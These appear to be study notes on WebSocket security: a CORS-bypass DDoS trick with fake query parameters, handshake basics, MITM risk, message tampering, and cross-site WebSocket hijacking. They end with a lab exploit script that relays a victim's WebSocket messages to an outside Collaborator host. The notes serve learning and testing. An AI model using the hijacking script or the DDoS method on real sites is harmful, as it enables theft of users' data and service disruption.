# WebSockets & WebWorkers 
## WebWorkers + CORS – DDoS Attack
With CORS, if in the response to the first request is either missing the Access-Control-Allow-Origin header or the value is inappropriate, then the browser will refuse to send more requests to the same URL.

To bypass this limitation, we create dummy requests and add fake parameters in the query-string. In doing so, we force the browser to transform each request, therefore identifying it as unique.

`http://victim.site/dossable.php?search=x`

# Websockets

## WebSockets vs HTTP
Some modern web sites use WebSockets. WebSocket connections are initiated over HTTP and are typically long-lived. Messages can be sent in either direction at any time and are not transactional in nature. The connection will normally stay open and idle until either the client or the server is ready to send a messag.

## Establishing a web socket
WebSocket connections are normally created using client-side JavaScript like the following:
```js
var ws = new WebSocket("wss://normal-website.com/chat");
```

> The wss protocol establishes a WebSocket over an encrypted TLS connection, while the ws protocol uses an unencrypted connection.

### Sample Request 
```
GET /chat HTTP/1.1  
Host: normal-website.com  
Sec-WebSocket-Version: 13  
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==  
Connection: keep-alive, Upgrade  
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2  
Upgrade: websocket
```

### Sample Response
```
HTTP/1.1 101 Switching Protocols  
Connection: Upgrade  
Upgrade: websocket  
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```


## Attacks

### MITM Attacks
In addition, the `WebSocket Protocol` standard defines two schemes for web socket connections: `ws` for unencrypted and `wss` for the ***encrypted**. If the implementation uses the unencrypted channel, we have a `MiTM` issue whereby, anybody on the network can see and manipulate the traffic.

## Manipulating WebSocket messages to exploit vulnerabilities
- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

> The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

## Manipulating the WebSocket handshake to exploit vulnerabilities
- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

## Cross-site WebSocket hijacking
### Explanation
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

> unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

Note: The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

### Sample exploit script
```html
<script>
websocket = new WebSocket('wss://ac631f5e1f1b3d0080dd77cf00e1008c.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY");
}
function handleReply(event) {
  fetch('https://7iqu3i67oznpep8xuy3o5rsgp7vxjm.burpcollaborator.net/?'+event.data, {mode: 'no-cors'})
}
</script>
```